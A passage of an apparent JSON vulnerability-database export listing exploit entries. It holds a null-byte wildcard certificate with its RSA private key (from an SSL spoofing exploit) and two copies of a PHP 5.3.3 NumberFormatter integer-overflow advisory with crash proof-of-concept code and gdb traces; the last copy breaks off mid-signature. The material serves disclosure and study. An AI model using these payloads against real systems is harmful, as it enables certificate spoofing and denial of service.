            "sourceData": "Private-Key: (1024 bit)\r\nmodulus:\r\n    00:cf:4d:17:42:00:8d:0c:41:95:31:8c:40:30:bc:\r\n    5e:42:b6:28:09:75:2f:19:61:d9:ab:4d:ec:f3:44:\r\n    c4:1c:01:95:6f:27:eb:70:07:98:4f:1e:05:d0:f3:\r\n    6c:49:45:e6:de:48:7a:59:f0:c2:93:6a:37:9c:02:\r\n    72:4f:bd:14:36:26:a1:70:97:d4:fe:4b:24:e8:cd:\r\n    29:1e:61:1a:85:b0:6f:96:06:83:10:13:d6:89:9f:\r\n    bd:07:67:f1:42:de:9b:63:67:8b:96:f9:06:ef:7c:\r\n    93:4b:6a:f9:39:31:32:7f:98:59:ef:ce:91:be:05:\r\n    ce:f0:82:33:d8:76:06:4c:9f\r\npublicExponent: 65537 (0x10001)\r\nprivateExponent:\r\n    00:8c:4f:3b:7c:ba:ee:bc:ea:ee:d6:58:7d:61:ff:\r\n    3d:35:9e:21:3f:35:87:a9:80:67:59:e1:26:8e:09:\r\n    6f:4b:1d:6f:4d:8b:11:7a:04:49:fc:d2:ef:50:dc:\r\n    51:e0:ce:65:52:f2:6f:8d:cc:bd:86:15:90:8a:11:\r\n    c5:d9:5e:ba:fc:2b:fc:e3:a0:cd:c8:f0:9a:05:76:\r\n    06:82:07:a9:bd:14:cc:c7:7e:54:b9:32:5b:40:7a:\r\n    35:0a:26:80:d7:30:98:d6:b7:71:d5:9d:f4:0d:f2:\r\n    28:b5:a9:0c:2e:6d:78:19:86:a9:31:b0:a1:43:1c:\r\n    57:2c:78:a9:42:b2:49:d8:71\r\nprime1:\r\n    00:ec:07:79:1d:e2:50:14:77:af:99:18:1b:14:d4:\r\n    0c:25:0c:20:26:0d:dd:c7:75:0e:08:d3:77:72:ce:\r\n    2d:57:80:9d:18:bb:60:7b:b2:62:4e:21:a1:e6:84:\r\n    96:91:31:15:cc:5b:89:5b:5a:83:07:96:51:e4:d4:\r\n    e6:3a:40:99:03\r\nprime2:\r\n    00:e0:d7:5a:07:0e:cc:a6:17:22:f8:ec:51:b1:7b:\r\n    17:af:3a:87:7b:f1:e4:6d:40:48:28:d2:c0:9c:93:\r\n    e0:f1:8f:79:07:8f:00:e0:49:1d:0e:8c:65:41:ba:\r\n    c8:20:e2:ae:78:54:75:6b:f0:41:e5:d1:9c:2e:23:\r\n    49:79:53:35:35\r\nexponent1:\r\n    15:17:15:db:75:bd:72:16:bf:ba:0e:4d:5d:2f:15:\r\n    66:ba:0e:a5:57:d7:d9:5a:bc:46:4d:9e:fe:c3:2d:\r\n    8a:04:14:05:81:b8:bd:54:d3:33:e8:0d:6f:6b:a9:\r\n    88:8f:ba:42:e8:6a:fd:9e:b8:d6:94:b7:fc:9a:89:\r\n    77:eb:0d:c1\r\nexponent2:\r\n    5c:5a:38:61:63:c3:cd:88:fd:55:6f:84:12:b9:73:\r\n    be:06:f5:75:84:a3:05:f8:fc:6a:c0:3e:5b:52:26:\r\n    78:32:2d:4d:5c:80:c8:9f:5f:6f:05:5d:e6:04:b9:\r\n    85:40:76:d7:78:21:8f:07:6d:99:df:62:1e:55:62:\r\n    2d:92:6e:ed\r\ncoefficient:\r\n    00:c5:62:ea:ee:85:5c:eb:e6:07:12:58:a5:63:5a:\r\n    8f:e3:b3:df:c5:1e:cc:01:cd:87:d4:12:3f:45:8e:\r\n    a9:4c:83:51:31:5a:e5:8d:11:a1:e3:84:b8:b4:e1:\r\n    12:33:eb:2d:4c:4e:8c:49:e2:0d:50:aa:ca:38:e3:\r\n    e6:c2:29:86:17\r\nCertificate Request:\r\n    Data:\r\n        Version: 0 (0x0)\r\n        Subject: C=US, CN=*\\x00thoughtcrime.noisebridge.net, ST=California, L=San Francisco, O=Noisebridge, OU=Moxie Marlinspike Fan Club\r\n        Subject Public Key Info:\r\n            Public Key Algorithm: rsaEncryption\r\n            RSA Public Key: (1024 bit)\r\n                Modulus (1024 bit):\r\n                    00:cf:4d:17:42:00:8d:0c:41:95:31:8c:40:30:bc:\r\n                    5e:42:b6:28:09:75:2f:19:61:d9:ab:4d:ec:f3:44:\r\n                    c4:1c:01:95:6f:27:eb:70:07:98:4f:1e:05:d0:f3:\r\n                    6c:49:45:e6:de:48:7a:59:f0:c2:93:6a:37:9c:02:\r\n                    72:4f:bd:14:36:26:a1:70:97:d4:fe:4b:24:e8:cd:\r\n                    29:1e:61:1a:85:b0:6f:96:06:83:10:13:d6:89:9f:\r\n                    bd:07:67:f1:42:de:9b:63:67:8b:96:f9:06:ef:7c:\r\n                    93:4b:6a:f9:39:31:32:7f:98:59:ef:ce:91:be:05:\r\n                    ce:f0:82:33:d8:76:06:4c:9f\r\n                Exponent: 65537 (0x10001)\r\n        Attributes:\r\n            a0:00\r\n    Signature Algorithm: md5WithRSAEncryption\r\n        64:e6:b2:77:45:74:c3:dc:f6:3d:e7:73:7f:0f:fb:dd:d7:30:\r\n        c3:0f:30:d5:52:2c:6b:41:ad:40:2b:4b:07:2a:de:80:69:d4:\r\n        a7:0b:6f:ed:cc:62:e7:4d:e1:fc:1e:81:0d:94:b9:c8:9b:14:\r\n        0a:10:d4:8e:f9:53:76:11:51:1d:c9:80:ca:15:e5:78:02:e1:\r\n        d1:89:95:b5:4a:3f:e0:f7:f3:35:ad:1f:7d:85:5b:8c:f5:de:\r\n        70:05:8f:4f:1d:cb:23:83:dd:63:b7:2f:1a:8c:a1:3c:67:d9:\r\n        f9:fc:63:c0:dc:bb:72:56:13:f6:3d:db:8e:d5:dc:01:9a:20:\r\n        a2:dc\r\n-----BEGIN RSA PRIVATE KEY-----\r\nMIICXQIBAAKBgQDPTRdCAI0MQZUxjEAwvF5CtigJdS8ZYdmrTezzRMQcAZVvJ+tw\r\nB5hPHgXQ82xJRebeSHpZ8MKTajecAnJPvRQ2JqFwl9T+SyTozSkeYRqFsG+WBoMQ\r\nE9aJn70HZ/FC3ptjZ4uW+QbvfJNLavk5MTJ/mFnvzpG+Bc7wgjPYdgZMnwIDAQAB\r\nAoGBAIxPO3y67rzq7tZYfWH/PTWeIT81h6mAZ1nhJo4Jb0sdb02LEXoESfzS71Dc\r\nUeDOZVLyb43MvYYVkIoRxdleuvwr/OOgzcjwmgV2BoIHqb0UzMd+VLkyW0B6NQom\r\ngNcwmNa3cdWd9A3yKLWpDC5teBmGqTGwoUMcVyx4qUKySdhxAkEA7Ad5HeJQFHev\r\nmRgbFNQMJQwgJg3dx3UOCNN3cs4tV4CdGLtge7JiTiGh5oSWkTEVzFuJW1qDB5ZR\r\n5NTmOkCZAwJBAODXWgcOzKYXIvjsUbF7F686h3vx5G1ASCjSwJyT4PGPeQePAOBJ\r\nHQ6MZUG6yCDirnhUdWvwQeXRnC4jSXlTNTUCQBUXFdt1vXIWv7oOTV0vFWa6DqVX\r\n19lavEZNnv7DLYoEFAWBuL1U0zPoDW9rqYiPukLoav2euNaUt/yaiXfrDcECQFxa\r\nOGFjw82I/VVvhBK5c74G9XWEowX4/GrAPltSJngyLU1cgMifX28FXeYEuYVAdtd4\r\nIY8HbZnfYh5VYi2Sbu0CQQDFYuruhVzr5gcSWKVjWo/js9/FHswBzYfUEj9FjqlM\r\ng1ExWuWNEaHjhLi04RIz6y1MToxJ4g1Qqso44+bCKYYX\r\n-----END RSA PRIVATE KEY-----\r\n-----BEGIN CERTIFICATE REQUEST-----\r\nMIIB3jCCAUcCADCBnjELMAkGA1UEBhMCVVMxJzAlBgNVBAMUHioAdGhvdWdodGNy\r\naW1lLm5vaXNlYnJpZGdlLm5ldDETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UE\r\nBxMNU2FuIEZyYW5jaXNjbzEUMBIGA1UEChMLTm9pc2VicmlkZ2UxIzAhBgNVBAsT\r\nGk1veGllIE1hcmxpbnNwaWtlIEZhbiBDbHViMIGfMA0GCSqGSIb3DQEBAQUAA4GN\r\nADCBiQKBgQDPTRdCAI0MQZUxjEAwvF5CtigJdS8ZYdmrTezzRMQcAZVvJ+twB5hP\r\nHgXQ82xJRebeSHpZ8MKTajecAnJPvRQ2JqFwl9T+SyTozSkeYRqFsG+WBoMQE9aJ\r\nn70HZ/FC3ptjZ4uW+QbvfJNLavk5MTJ/mFnvzpG+Bc7wgjPYdgZMnwIDAQABoAAw\r\nDQYJKoZIhvcNAQEEBQADgYEAZOayd0V0w9z2Pedzfw/73dcwww8w1VIsa0GtQCtL\r\nByregGnUpwtv7cxi503h/B6BDZS5yJsUChDUjvlTdhFRHcmAyhXleALh0YmVtUo/\r\n4PfzNa0ffYVbjPXecAWPTx3LI4PdY7cvGoyhPGfZ+fxjwNy7clYT9j3bjtXcAZog\r\notw=\r\n-----END CERTIFICATE REQUEST-----\r\n-----BEGIN CERTIFICATE-----\r\nMIIGTjCCBbegAwIBAgIDExefMA0GCSqGSIb3DQEBBQUAMIIBEjELMAkGA1UEBhMC\r\nRVMxEjAQBgNVBAgTCUJhcmNlbG9uYTESMBAGA1UEBxMJQmFyY2Vsb25hMSkwJwYD\r\nVQQKEyBJUFMgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkgcy5sLjEuMCwGA1UEChQl\r\nZ2VuZXJhbEBpcHNjYS5jb20gQy5JLkYuICBCLUI2MjIxMDY5NTEuMCwGA1UECxMl\r\naXBzQ0EgQ0xBU0VBMSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTEuMCwGA1UEAxMl\r\naXBzQ0EgQ0xBU0VBMSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTEgMB4GCSqGSIb3\r\nDQEJARYRZ2VuZXJhbEBpcHNjYS5jb20wHhcNMDkwNzMwMDcxNDQyWhcNMTEwNzMw\r\nMDcxNDQyWjCBnjELMAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAU\r\nBgNVBAcTDVNhbiBGcmFuY2lzY28xFDASBgNVBAoTC05vaXNlYnJpZGdlMSMwIQYD\r\nVQQLExpNb3hpZSBNYXJsaW5zcGlrZSBGYW4gQ2x1YjEnMCUGA1UEAxQeKgB0aG91\r\nZ2h0Y3JpbWUubm9pc2VicmlkZ2UubmV0MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCB\r\niQKBgQDPTRdCAI0MQZUxjEAwvF5CtigJdS8ZYdmrTezzRMQcAZVvJ+twB5hPHgXQ\r\n82xJRebeSHpZ8MKTajecAnJPvRQ2JqFwl9T+SyTozSkeYRqFsG+WBoMQE9aJn70H\r\nZ/FC3ptjZ4uW+QbvfJNLavk5MTJ/mFnvzpG+Bc7wgjPYdgZMnwIDAQABo4IDITCC\r\nAx0wCQYDVR0TBAIwADARBglghkgBhvhCAQEEBAMCBkAwCwYDVR0PBAQDAgP4MBMG\r\nA1UdJQQMMAoGCCsGAQUFBwMBMB0GA1UdDgQWBBStfpIwBXE+eXWUWtE3s5JqXon2\r\nTzAfBgNVHSMEGDAWgBQOB2DUOckbW12QeyPI0jSdSppGOTAJBgNVHREEAjAAMBwG\r\nA1UdEgQVMBOBEWdlbmVyYWxAaXBzY2EuY29tMHIGCWCGSAGG+EIBDQRlFmNPcmdh\r\nbml6YXRpb24gSW5mb3JtYXRpb24gTk9UIFZBTElEQVRFRC4gQ0xBU0VBMSBTZXJ2\r\nZXIgQ2VydGlmaWNhdGUgaXNzdWVkIGJ5IGh0dHBzOi8vd3d3Lmlwc2NhLmNvbS8w\r\nLwYJYIZIAYb4QgECBCIWIGh0dHBzOi8vd3d3Lmlwc2NhLmNvbS9pcHNjYTIwMDIv\r\nMEMGCWCGSAGG+EIBBAQ2FjRodHRwczovL3d3dy5pcHNjYS5jb20vaXBzY2EyMDAy\r\nL2lwc2NhMjAwMkNMQVNFQTEuY3JsMEYGCWCGSAGG+EIBAwQ5FjdodHRwczovL3d3\r\ndy5pcHNjYS5jb20vaXBzY2EyMDAyL3Jldm9jYXRpb25DTEFTRUExLmh0bWw/MEMG\r\nCWCGSAGG+EIBBwQ2FjRodHRwczovL3d3dy5pcHNjYS5jb20vaXBzY2EyMDAyL3Jl\r\nbmV3YWxDTEFTRUExLmh0bWw/MEEGCWCGSAGG+EIBCAQ0FjJodHRwczovL3d3dy5p\r\ncHNjYS5jb20vaXBzY2EyMDAyL3BvbGljeUNMQVNFQTEuaHRtbDCBgwYDVR0fBHww\r\nejA5oDegNYYzaHR0cDovL3d3dy5pcHNjYS5jb20vaXBzY2EyMDAyL2lwc2NhMjAw\r\nMkNMQVNFQTEuY3JsMD2gO6A5hjdodHRwOi8vd3d3YmFjay5pcHNjYS5jb20vaXBz\r\nY2EyMDAyL2lwc2NhMjAwMkNMQVNFQTEuY3JsMDIGCCsGAQUFBwEBBCYwJDAiBggr\r\nBgEFBQcwAYYWaHR0cDovL29jc3AuaXBzY2EuY29tLzANBgkqhkiG9w0BAQUFAAOB\r\ngQAjzXaLBu+/+RP0vQ6WjW/Pxgm4WQYhecqZ2+7ZFbsUCMJPQ8XE2uv+rIteGnRF\r\nZr3hYb+dVlfUnethjPhazZW+/hU4FePqmlbTtmMe+zMLThiScyC8y3EW4L4BZYcp\r\np1drPlZIj2RmSgPQ99oToUk5O6t+LMg1N14ajr9TpM8yNQ==\r\n-----END CERTIFICATE-----",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:10071"
        }
    ],
    "CVE-2010-4409": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-70379",
            "id": "SSV:70379",
            "title": "PHP 5.3.3 NumberFormatter::getSymbol Integer Overflow",
            "type": "seebug",
            "sourceData": "\n                                                From: Maksymilian Arciemowicz &#60;cxib () securityreason com&#62;\r\nDate: Fri, 10 Dec 2010 14:43:32 +0100\r\n-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA1\r\n\r\n[ PHP 5.3.3 NumberFormatter::getSymbol Integer Overflow ]\r\n\r\nAuthor: Maksymilian Arciemowicz\r\nhttp://securityreason.com/\r\nhttp://cxib.net/\r\nDate:\r\n- - Dis.: 11.11.2010\r\n- - Pub.: 10.12.2010\r\n\r\nCERT: VU#479900\r\nCVE: CVE-2010-4409\r\nCWE: CWE-189\r\nStatus: Fixed in PHP 5.3.4\r\n\r\nAffected Software:\r\n- - PHP 5.3.3\r\n\r\nOriginal URL:\r\nhttp://securityreason.com/achievement_securityalert/91\r\n\r\n\r\n- --- 0.Description ---\r\nInternationalization extension (further is referred as Intl) is a\r\nwrapper for ICU library, enabling PHP programmers to perform\r\nUCA-conformant collation and date/time/number/currency formatting in\r\ntheir scripts.\r\n\r\nNumber Formatter: allows to display number according to the localized\r\nformat or given pattern or set of rules, and to parse strings into numbers.\r\n\r\n\r\n- --- 1. PoC for Integer Overflow ---\r\n$nx=new NumberFormatter(&#34;pl&#34;,1);\r\n$nx-&#62;getSymbol(2147483648);\r\n\r\n\r\n- --- 2. PHP 5.3.3/5.2.14 NumberFormatter::getSymbol Integer Overflow ---\r\nAs we can see in\r\n\r\n- ---\r\nPHP_FUNCTION( numfmt_get_symbol )\r\n{\r\n        long symbol;\r\n        UChar value_buf[4];\r\n        UChar *value = value_buf;\r\n        int length = USIZE(value);\r\n        FORMATTER_METHOD_INIT_VARS;\r\n\r\n        /* Parse parameters. */\r\n        if( zend_parse_method_parameters( ZEND_NUM_ARGS() TSRMLS_CC, getThis(),\r\n&#34;Ol&#34;,\r\n                &object, NumberFormatter_ce_ptr, &symbol ) == FAILURE )\r\n        {\r\n                intl_error_set( NULL, U_ILLEGAL_ARGUMENT_ERROR,\r\n                        &#34;numfmt_get_symbol: unable to parse input params&#34;, 0 TSRMLS_CC );\r\n\r\n                RETURN_FALSE;\r\n        }\r\n\r\n        /* Fetch the object. */\r\n        FORMATTER_METHOD_FETCH_OBJECT;\r\n\r\n        length = unum_getSymbol(FORMATTER_OBJECT(nfo), symbol, value_buf,\r\nlength, &INTL_DATA_ERROR_CODE(nfo)); &#60;================= !!!TO BIG INT\r\nHERE!!!\r\n...\r\n- ---\r\n\r\nwill crash for differ value. example {2444492804, 2147483648,\r\n2147483649, 2554462209} (when rdi out off band (range 2to31 2to32 under\r\n64bits linux)\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x00007fffedf317f5 in icu_4_2::UnicodeString::extract(unsigned short*,\r\nint, UErrorCode&) const () from /usr/lib/libicuuc.so.42\r\n(gdb) bt\r\n#0  0x00007fffedf317f5 in icu_4_2::UnicodeString::extract(unsigned\r\nshort*, int, UErrorCode&) const () from /usr/lib/libicuuc.so.42\r\n#1  0x00007fffee5d11c0 in zif_numfmt_get_symbol (ht=17168120,\r\n    return_value=0x105c928, return_value_ptr=0x4, this_ptr=0x105f710,\r\n    return_value_used=17168144)\r\n    at /build/buildd/php5-5.3.3/ext/intl/formatter/formatter_attr.c:269\r\n...blabla\r\n\r\nrip            0x7fffedf317f5   0x7fffedf317f5\r\n&#60;icu_4_2::UnicodeString::extract(unsigned short*, int, UErrorCode&)\r\nconst+21&#62;\r\neflags         0x10206  [ PF IF RF ]\r\n\r\nlet`s see value ~4294901761\r\n\r\n$nx=new NumberFormatter(&#34;pl&#34;,1);\r\n$nx-&#62;getSymbol(4294901761);\r\n\r\nwill crash in memcpy(3) ;]\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\nmemcpy () at ../sysdeps/x86_64/memcpy.S:90\r\n90      ../sysdeps/x86_64/memcpy.S: No such file or directory.\r\n        in ../sysdeps/x86_64/memcpy.S\r\n(gdb) bt\r\n#0  memcpy () at ../sysdeps/x86_64/memcpy.S:90\r\n#1  0x00007fffea74a86a in icu_4_2::UnicodeString::extract(unsigned\r\nshort*, int, UErrorCode&) const () from /usr/lib/libicuuc.so.42\r\n#2  0x00007fffeadea2b4 in zif_numfmt_get_symbol (ht=17826952,\r\n    return_value=0x10fecd0, return_value_ptr=0xc, this_ptr=0x11004a0,\r\n    return_value_used=17826976)\r\n    at /build/buildd/php5-5.3.3/ext/intl/formatter/formatter_attr.c:274\r\n#3  0x00000000006e986a in zend_do_fcall_common_helper_SPEC (\r\n    execute_data=0x7ffff7eb8068)\r\n    at /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316\r\n...\r\n\r\nlet&#39;s see ICU UnicodeString::extract(unsigned short*, int, UErrorCode&)\r\n\r\n- ---\r\nint32_t\r\nUnicodeString::extract(UChar *dest, int32_t destCapacity,\r\n                       UErrorCode &errorCode) const {\r\n  int32_t len = length();\r\n  if(U_SUCCESS(errorCode)) {\r\n    if(isBogus() || destCapacity&#60;0 || (destCapacity&#62;0 && dest==0)) {\r\n      errorCode=U_ILLEGAL_ARGUMENT_ERROR;\r\n    } else {\r\n      const UChar *array = getArrayStart();\r\n      if(len&#62;0 && len&#60;=destCapacity && array!=dest) {\r\n        uprv_memcpy(dest, array, len*U_SIZEOF_UCHAR); &#60;======= MEMCPY\r\nREFERENCE HERE\r\n      }\r\n      return u_terminateUChars(dest, destCapacity, len, &errorCode);\r\n    }\r\n  }\r\n\r\n  return len;\r\n\r\n}\r\n- ---\r\n\r\nso crash in rip=memcpy(3).\r\n\r\nMethod getLocal() also can generate simple crash (CWE-170)\r\n\r\n$nx=new IntlDateFormatter(&#34;pl&#34;, IntlDateFormatter::FULL,\r\nIntlDateFormatter::FULL);\r\n$nx-&#62;getLocale(1);\r\n\r\n\r\n- --- 3. Fix ---\r\nFix in next PHP Version 5.3.4:\r\nhttp://www.kb.cert.org/vuls/id/479900\r\n\r\nSVN:\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/intl/dateformat/dateformat_attr.c?view=log\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/intl/formatter/formatter_attr.c?view=log\r\n\r\n\r\n- --- 4. Greets ---\r\nSpecial thanks for Pierre Joye and Stas Malyshev for very quickly fix\r\nMichael Orlando for security support\r\n\r\nand sp3x, Infospec\r\n\r\n\r\n- --- 5. Contact ---\r\nAuthor: SecurityReason.com [ Maksymilian Arciemowicz ]\r\n\r\nEmail:\r\n- - cxib {a\\./t] securityreason [d=t} com\r\n\r\nGPG:\r\n- - http://securityreason.com/key/Arciemowicz.Maksymilian.gpg\r\n\r\nhttp://securityreason.com/\r\nhttp://cxib.net/\r\n- -- \r\nBest Regards\r\npub   4096R/D6E5B530 2010-09-19\r\nuid                  Maksymilian Arciemowicz (cx) &#60;max () cxib net&#62;\r\nsub   4096R/58BA663C 2010-09-19\r\n-----BEGIN PGP SIGNATURE-----\r\n\r\niQIcBAEBAgAGBQJNAi5vAAoJEIO8+dzW5bUwsdsP/3/XRI/fXcqRg154DObVa/Ew\r\nLgVS9ZP5yrTG2JBZnYYSHRB6ZXpK7hEfM838/gVLAolMEnLplynqmiTef74gHBAN\r\n/VIGpE7sZDsxTeAk+MWzecxS0Gp77kR8ibcd8kClKmdcodgZ+JSJab/3snAclBXT\r\nCesuN20tUPS4d7sjxTz7K9uZhO+7ezZn6xnJr67l2xcx8xCcrnNNRzapEzQ6tcBj\r\ncM3pMxond3uAGQT3+ewwl1GQ/30HkX3fjPJPhT6Mna9/LH7f5IGHSnSxw5lJbUjY\r\nxMaB+qTE44TrKTKqKkkowsPpAeaoQ7a3O16YG6qcWfly+9bf2vQVNhcG+hAa6mgK\r\nekNkleDKg+n7Qsgsrl/4mFS/40tCTss9/PQ8/QEp2g4VOSeyzuoVB2PJDl48X4pH\r\nxabNVh9T3LWkxTnC5wcy2tuF7Tbb1eOngMxBclB9xR6vjr0nqT5EHLy4w+VnXo3I\r\nFICv2EhojYXpxgrQEteK0JVnZC3ROspAJDM7YC4ZXk4HSRKnFK2Ymf+yyzhycyHu\r\ncj1F70DTCNvXfdWUuvKVlTQUM4BDGpR1xs23EZqVky+8lk1mRJW98UwCs0kqpN46\r\nmaS8ZXM1+8dEMZFx/2wRcI2xkFoViMuKFpqwvVG+TPYY0fUSUfNdYCoxxl4YiWdD\r\nu0SjiF38TxqaIjNnvaym\r\n=3G4F\r\n-----END PGP SIGNATURE-----\n                              ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:70379"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.3.3 NumberFormatter::getSymbol Integer Overflow. CVE-2010-4409. Dos exploits for multiple platform",
            "modified": "2010-12-10T00:00:00",
            "published": "2010-12-10T00:00:00",
            "id": "EDB-ID:15722",
            "href": "https://www.exploit-db.com/exploits/15722/",
            "type": "exploitdb",
            "title": "PHP 5.3.3 NumberFormatter::getSymbol Integer Overflow",
            "sourceData": "From: Maksymilian Arciemowicz <cxib () securityreason com>\r\nDate: Fri, 10 Dec 2010 14:43:32 +0100\r\n-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA1\r\n\r\n[ PHP 5.3.3 NumberFormatter::getSymbol Integer Overflow ]\r\n\r\nAuthor: Maksymilian Arciemowicz\r\nhttp://securityreason.com/\r\nhttp://cxib.net/\r\nDate:\r\n- - Dis.: 11.11.2010\r\n- - Pub.: 10.12.2010\r\n\r\nCERT: VU#479900\r\nCVE: CVE-2010-4409\r\nCWE: CWE-189\r\nStatus: Fixed in PHP 5.3.4\r\n\r\nAffected Software:\r\n- - PHP 5.3.3\r\n\r\nOriginal URL:\r\nhttp://securityreason.com/achievement_securityalert/91\r\n\r\n\r\n- --- 0.Description ---\r\nInternationalization extension (further is referred as Intl) is a\r\nwrapper for ICU library, enabling PHP programmers to perform\r\nUCA-conformant collation and date/time/number/currency formatting in\r\ntheir scripts.\r\n\r\nNumber Formatter: allows to display number according to the localized\r\nformat or given pattern or set of rules, and to parse strings into numbers.\r\n\r\n\r\n- --- 1. PoC for Integer Overflow ---\r\n$nx=new NumberFormatter(\"pl\",1);\r\n$nx->getSymbol(2147483648);\r\n\r\n\r\n- --- 2. PHP 5.3.3/5.2.14 NumberFormatter::getSymbol Integer Overflow ---\r\nAs we can see in\r\n\r\n- ---\r\nPHP_FUNCTION( numfmt_get_symbol )\r\n{\r\n        long symbol;\r\n        UChar value_buf[4];\r\n        UChar *value = value_buf;\r\n        int length = USIZE(value);\r\n        FORMATTER_METHOD_INIT_VARS;\r\n\r\n        /* Parse parameters. */\r\n        if( zend_parse_method_parameters( ZEND_NUM_ARGS() TSRMLS_CC, getThis(),\r\n\"Ol\",\r\n                &object, NumberFormatter_ce_ptr, &symbol ) == FAILURE )\r\n        {\r\n                intl_error_set( NULL, U_ILLEGAL_ARGUMENT_ERROR,\r\n                        \"numfmt_get_symbol: unable to parse input params\", 0 TSRMLS_CC );\r\n\r\n                RETURN_FALSE;\r\n        }\r\n\r\n        /* Fetch the object. */\r\n        FORMATTER_METHOD_FETCH_OBJECT;\r\n\r\n        length = unum_getSymbol(FORMATTER_OBJECT(nfo), symbol, value_buf,\r\nlength, &INTL_DATA_ERROR_CODE(nfo)); <================= !!!TO BIG INT\r\nHERE!!!\r\n...\r\n- ---\r\n\r\nwill crash for differ value. example {2444492804, 2147483648,\r\n2147483649, 2554462209} (when rdi out off band (range 2to31 2to32 under\r\n64bits linux)\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x00007fffedf317f5 in icu_4_2::UnicodeString::extract(unsigned short*,\r\nint, UErrorCode&) const () from /usr/lib/libicuuc.so.42\r\n(gdb) bt\r\n#0  0x00007fffedf317f5 in icu_4_2::UnicodeString::extract(unsigned\r\nshort*, int, UErrorCode&) const () from /usr/lib/libicuuc.so.42\r\n#1  0x00007fffee5d11c0 in zif_numfmt_get_symbol (ht=17168120,\r\n    return_value=0x105c928, return_value_ptr=0x4, this_ptr=0x105f710,\r\n    return_value_used=17168144)\r\n    at /build/buildd/php5-5.3.3/ext/intl/formatter/formatter_attr.c:269\r\n...blabla\r\n\r\nrip            0x7fffedf317f5   0x7fffedf317f5\r\n<icu_4_2::UnicodeString::extract(unsigned short*, int, UErrorCode&)\r\nconst+21>\r\neflags         0x10206  [ PF IF RF ]\r\n\r\nlet`s see value ~4294901761\r\n\r\n$nx=new NumberFormatter(\"pl\",1);\r\n$nx->getSymbol(4294901761);\r\n\r\nwill crash in memcpy(3) ;]\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\nmemcpy () at ../sysdeps/x86_64/memcpy.S:90\r\n90      ../sysdeps/x86_64/memcpy.S: No such file or directory.\r\n        in ../sysdeps/x86_64/memcpy.S\r\n(gdb) bt\r\n#0  memcpy () at ../sysdeps/x86_64/memcpy.S:90\r\n#1  0x00007fffea74a86a in icu_4_2::UnicodeString::extract(unsigned\r\nshort*, int, UErrorCode&) const () from /usr/lib/libicuuc.so.42\r\n#2  0x00007fffeadea2b4 in zif_numfmt_get_symbol (ht=17826952,\r\n    return_value=0x10fecd0, return_value_ptr=0xc, this_ptr=0x11004a0,\r\n    return_value_used=17826976)\r\n    at /build/buildd/php5-5.3.3/ext/intl/formatter/formatter_attr.c:274\r\n#3  0x00000000006e986a in zend_do_fcall_common_helper_SPEC (\r\n    execute_data=0x7ffff7eb8068)\r\n    at /build/buildd/php5-5.3.3/Zend/zend_vm_execute.h:316\r\n...\r\n\r\nlet's see ICU UnicodeString::extract(unsigned short*, int, UErrorCode&)\r\n\r\n- ---\r\nint32_t\r\nUnicodeString::extract(UChar *dest, int32_t destCapacity,\r\n                       UErrorCode &errorCode) const {\r\n  int32_t len = length();\r\n  if(U_SUCCESS(errorCode)) {\r\n    if(isBogus() || destCapacity<0 || (destCapacity>0 && dest==0)) {\r\n      errorCode=U_ILLEGAL_ARGUMENT_ERROR;\r\n    } else {\r\n      const UChar *array = getArrayStart();\r\n      if(len>0 && len<=destCapacity && array!=dest) {\r\n        uprv_memcpy(dest, array, len*U_SIZEOF_UCHAR); <======= MEMCPY\r\nREFERENCE HERE\r\n      }\r\n      return u_terminateUChars(dest, destCapacity, len, &errorCode);\r\n    }\r\n  }\r\n\r\n  return len;\r\n\r\n}\r\n- ---\r\n\r\nso crash in rip=memcpy(3).\r\n\r\nMethod getLocal() also can generate simple crash (CWE-170)\r\n\r\n$nx=new IntlDateFormatter(\"pl\", IntlDateFormatter::FULL,\r\nIntlDateFormatter::FULL);\r\n$nx->getLocale(1);\r\n\r\n\r\n- --- 3. Fix ---\r\nFix in next PHP Version 5.3.4:\r\nhttp://www.kb.cert.org/vuls/id/479900\r\n\r\nSVN:\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/intl/dateformat/dateformat_attr.c?view=log\r\nhttp://svn.php.net/viewvc/php/php-src/branches/PHP_5_3/ext/intl/formatter/formatter_attr.c?view=log\r\n\r\n\r\n- --- 4. Greets ---\r\nSpecial thanks for Pierre Joye and Stas Malyshev for very quickly fix\r\nMichael Orlando for security support\r\n\r\nand sp3x, Infospec\r\n\r\n\r\n- --- 5. Contact ---\r\nAuthor: SecurityReason.com [ Maksymilian Arciemowicz ]\r\n\r\nEmail:\r\n- - cxib {a\\./t] securityreason [d=t} com\r\n\r\nGPG:\r\n- - http://securityreason.com/key/Arciemowicz.Maksymilian.gpg\r\n\r\nhttp://securityreason.com/\r\nhttp://cxib.net/\r\n- -- \r\nBest Regards\r\npub   4096R/D6E5B530 2010-09-19\r\nuid                  Maksymilian Arciemowicz (cx) <max () cxib net>\r\nsub   4096R/58BA663C 2010-09-19\r\n-----BEGIN PGP 